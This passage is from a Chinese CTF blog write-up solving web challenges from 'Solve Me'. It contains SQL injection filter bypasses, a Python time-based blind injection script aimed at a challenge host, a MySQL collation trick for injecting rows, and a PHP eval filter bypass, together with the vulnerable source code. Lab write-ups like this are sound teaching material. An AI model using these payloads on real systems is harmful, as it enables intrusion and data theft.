<code>|\\\\|</code>也就是说，反斜杠没有被过滤。这样我们可以注入反斜杠把id的第二个单引号给搞掉。这样一来就可以注入了<br>第二点就是他那个<code>union[\s\xA0]+select</code>把所有非空字符都过滤掉了，所以说直接上<code>union select</code>是不太行的,但是我们可以用<code>union all select</code>去绕过<br>然后是注释的问题，因为正则里面明确把<code>#</code>，还有<code>--加上空字符</code>过滤掉了，那我们用<code>--%1a</code>注释也是可以的<br>还有因为这里<code>order by</code> 也过滤了，只能手动去测试列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>发现回显的是Login failed说明列数不对，再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>还是login failed,再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2,3 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>这时候回显Hello了，代码逻辑跳到第一个if条件里面，说明有3列<br>然后我们直接上payload<br><code>?id=\&amp;pw=union all select 31337,2,3 from antisqli --%1A</code> 直接出flag<br>这里的语句在数据库里大概是这样的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`antisqli`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">' \' and `pw` = md5('</span> <span class="keyword">union</span> all <span class="keyword">select</span> .... <span class="keyword">from</span> ... <span class="comment">--%1a</span></span><br></pre></td></tr></table></figure><p>重点是union all前面的语句为空，直接执行后面的语句，这太灵活了，又学到了</p><h3 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Not allowed input'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql = <span class="keyword">new</span> SQLite3(<span class="string">'name_check.db'</span>, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">           SELECT </span></span><br><span class="line"><span class="string">           MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">           INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">           MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">           SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">       ;"</span>);</span><br><span class="line">       <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       <span class="keyword">if</span>(</span><br><span class="line">           $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">           array_sum($row) !== <span class="number">4</span> </span><br><span class="line">       )&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>我没玩过sqlite，但是感觉这里一定要满足admin这个东西，因为query函数后面的东西，但是这里的过滤是正整一个词的过滤，但是我们可以用sqlite的连接词<code>||</code>去实现绕过，但是对于mysql字符串的拼接只能用<code>concat</code>函数去拼接<br>所以最后的payload：<code>ad&#39;||&#39;min</code></p><h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">            $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">            mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个题目也是很骚，我第一次遇见这一种类型的题目，利用来了php以及mysql之间的延时关系去绕过那一个可恶的12.。。<br>但是执行过程过于缓慢啊，主要是两个延时太过耗时<br>概述一下这题目的意思传参进去之后，如果没有对应的表就根据你的ip创建一个表，并且这个表里面含有一个名为COUNT的字段，初始值为1，后面就一直往这里面的COUNT+1，如果到12的话就会把表删掉重新再新建一个表，所以关键是他的逻辑顺序出了错误。</p><p><code>判断count的值–&gt;执行SQL语句–&gt;加count值</code></p><p>这个逻辑在执行语句的时候有问题，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer，这确实骚气<br>小脚本，最好还是把header啥的都弄进去，毕竟是靠ip建表的，这个东西跑得很慢不值得，而且一直都跑的错的答案，QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"</span>,</span><br><span class="line">     <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">     <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Referer"</span>: <span class="string">"http://iamslowly.thinkout.rf.gd/"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"__test=4e8126e93f7b5a4448c7e3c1f0b7853e"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(30),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">29</span>).content</span><br><span class="line">            <span class="comment">#print(content[:10])</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+]Waiting!'</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Cheap-Lottery"><a href="#Cheap-Lottery" class="headerlink" title="Cheap Lottery"></a>Cheap Lottery</h3><p>这个题目一开始用扫描器扫一下发现里面存在robots.txt打开发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backup/</span><br></pre></td></tr></table></figure><p>进去backup发现几个文件</p><p>一个数据库文件，还有一份源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span> (</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`time`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`nums`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span></span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`name`</span> (<span class="string">`name`</span>);</span><br></pre></td></tr></table></figure><p>作为菜鸟感觉是SQL注入，但无从下手，知道发现原来方方土学长早就写过这题的题解<a href="https://www.anquanke.com/post/id/101939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101939</a><br>这波骚操作还是6，运用了字符集去绕过</p><p>而且p神也发过类似的文章(tql,QAQ)<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p><p>先讲一下这一段代码的意思，发现骆骆大佬早就做过这题而且流程图都画好了，我就直接贴图吧。。简单粗暴<br><img src="https://s1.ax1x.com/2018/04/03/CpBkLt.png" alt="这里写图片描述"></p><p>我们要利用的点就是这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nums = preg_replace(<span class="string">"/[a-zA-Z\[\]\=]/"</span>, <span class="string">""</span>, $url_query);</span><br><span class="line">$nums = strtr($nums, <span class="string">"&amp;"</span>, <span class="string">","</span>);</span><br><span class="line">$sql-&gt;query(<span class="string">"INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');"</span>);</span><br></pre></td></tr></table></figure><p>这段代码往数据库里面添加数据，只要我们往里面添加自己规定的值，然后再在另一处以同一ip地址进行访问(不购买)不就可以直接进到check模块了。。<br>意思就是这样<br>开始数据库里面是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69,69,69,69,69'</span>);</span><br></pre></td></tr></table></figure><p>后来我们构造，使数据库一开始就存在这样的值，我们下一次访问的时候就名正言顺的是买正确了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69'</span>),(<span class="string">'admin1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>),(<span class="string">'guest_1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>)<span class="comment">#',69,69,69,69');</span></span><br></pre></td></tr></table></figure><p>就可以名正言顺地使<code>bingo</code>这个值等于5，然后就输出flag了，也就是进入下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$bingo = <span class="number">0</span>;</span><br><span class="line">$nums_admin = explode(<span class="string">","</span>, $row_admin[<span class="string">'nums'</span>]); <span class="comment">// admin_*</span></span><br><span class="line">$nums_guest = explode(<span class="string">","</span>, $row_guest[<span class="string">'nums'</span>]); <span class="comment">// guest_*</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i)&#123;</span><br><span class="line"><span class="keyword">for</span>($k = <span class="number">0</span>; $k &lt; <span class="number">5</span>; ++$k)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k])&#123;</span><br><span class="line">++$bingo;</span><br><span class="line"><span class="keyword">unset</span>($nums_guest[$k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($bingo == <span class="number">5</span>)&#123; <span class="comment">// correct all</span></span><br><span class="line">$msg = <span class="string">"Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;/code&gt;."</span>;</span><br></pre></td></tr></table></figure><p>但是我们要网关键的代码注入自己想要的东西，就必须得绕过字母这个步骤，这里开始及牵涉到字符集的问题了。</p><p>总结一下那几篇博客看到的点<br>MySQL中的字符集转换过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results</span><br></pre></td></tr></table></figure></p><p>也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_set_client -&gt; character_set_connection -&gt; 内部操作字符集</span><br></pre></td></tr></table></figure><p>而且p神说的在MySQL里面的utf-8是阉割版，最长只支持三个字节，<br>如果你需要Mysql支持四字节的utf-8，可以使用utf8mb4编码。<br>但是这个点跟这题无关，这个点用在让数据库误认为该字母不存在直接舍弃掉的情况</p><p>第二个点是<br>mysql 有两个支持 unicode 的 character set:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ucs2: 使用 16 bits 来表示一个 unicode 字符。</span><br><span class="line">utf8: 使用 1~3 bytes 来表示一个 unicode 字符。</span><br></pre></td></tr></table></figure><p>而在本题目中，sql文件中显示</p><p><code>ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></p><p>很显然这里是utf8，而我们一般数据库默认使用的是utf8_general_ci，而ci是指case insensitive的缩写，即大小写不敏感</p><p>这样也表明了为什么平常我们在cmd命令行下写数据库命令不区分大小写了</p><p>根据方方土学长所说的，这种模式由于diacritic ordering的排序问题使得读音符号最后被认定为英文字母</p><p>也就是对于utf8_general_ci，认为以下样例是相等的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ä = A</span><br><span class="line">Ö = O</span><br><span class="line">Ü = U</span><br></pre></td></tr></table></figure><p>而且还给出了这个超级腻害的表<br><a href="http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html" target="_blank" rel="noopener">http://collation-charts.org/mysql60/mysql604.utf8_general_ci.european.html</a><br>表格上方是 unicode 编码，下方是 utf8 编码</p><p>然后构造一下admin还有guest</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin: %C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1</span><br><span class="line">guest: %C4%9D%C3%B9%C3%A8%C5%9B%C5%A3</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$vps_ip = <span class="string">'你的vps地址'</span>;</span><br><span class="line">$time = time();</span><br><span class="line">    $url = <span class="string">"http://cheaplottery.solveme.peng.kr/index.php?lottery%5BA%5D=1'),('%C3%A4%C4%8F%E1%B8%BF%C3%AF%C3%B1_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1'),('%C4%9D%C3%B9%C3%A8%C5%9B%C5%A3_"</span>.$vps_ip.<span class="string">"','&#123;$time&#125;','1,1,1,1,1')%23&amp;lottery%5BB%5D=&amp;lottery%5BC%5D=&amp;lottery%5BD%5D=&amp;lottery%5BE%5D="</span>;</span><br><span class="line">    <span class="keyword">echo</span> $url;</span><br></pre></td></tr></table></figure><p>然后在你的vps上再curl一下就得到flag了</p><p><a href="https://imgchr.com/i/P2t4AI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2t4AI.md.png" alt="P2t4AI.md.png"></a></p><h3 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">'return\''</span>.sha1(time()).<span class="string">'\';'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="./?flag='</span>.$exam.<span class="string">'"&gt;Click here&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'flag'</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed length'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span>, $_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not allowed keyword'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">'flag'</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What\'s going on?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这段代码主要利用的是if条件里面的eval函数直接输出flag,前提是这里过滤十分强大，把所有可以执行的函数全部过滤，这时候只能利用开发的一个知识，就是<code>&lt;?=$flag?&gt;</code>,可以直接把flag里面的内容直接输出来，这东西我也是在学YII框架的时候学会的。<br>可以直接看一下文档里面有这样的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br></pre></td></tr></table></figure><p>这相当于说这是一个echo的缩写版<br><a href="https://imgchr.com/i/P2tbjg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P2tbjg.md.png" alt="P2tbjg.md.png"></a><br>另外呢这两句话表明了php5.4以后都存在这样的缩写形式<br>我们现在还要考虑的是如何绕过长度的问题以及不要在payload里面存在flag这个词，所以最后的payload是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=$a=&apos;blag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</span><br></pre></td></tr></table></figure><p>这里前面的<code>?&gt;</code>的是利用了html里面的嵌套PHP的语法，同时也为了后面的<code>&lt;?=?&gt;</code>可以顺利执行，中间的<code>1</code>就是为了满足<code>strlen</code>这个函数从而执行下面的代码</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.IP地址可以用ip2long这个函数尝试去绕过<br>2.回顾了科学计数法还有这个指数形式在bypass方面的绕过<br>3.parse_url()这个函数的几个小trick，分别是对于特殊字符会替换成_,以及在///的情况下会使后面的东西忽略从而导致绕过<br>4.关于注入这东西，灵活一些，别太死板，除了一些特殊的方法绕过以外，还可以考虑字符集(这里包括16进制)<br>5.eval函数里面的执行文件操作的函数都被过滤了，可以使用缩写输出之类<br>6.正则匹配注意一下匹配\的写法应该是四个|\\|,而且对于正则的规则以^开头$结尾的，可以%0a去bypass<br>7.还有飘零大哥的思路，代码审计拿来可能是SQL注入还有逻辑漏洞这也是很骚气的，22333</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
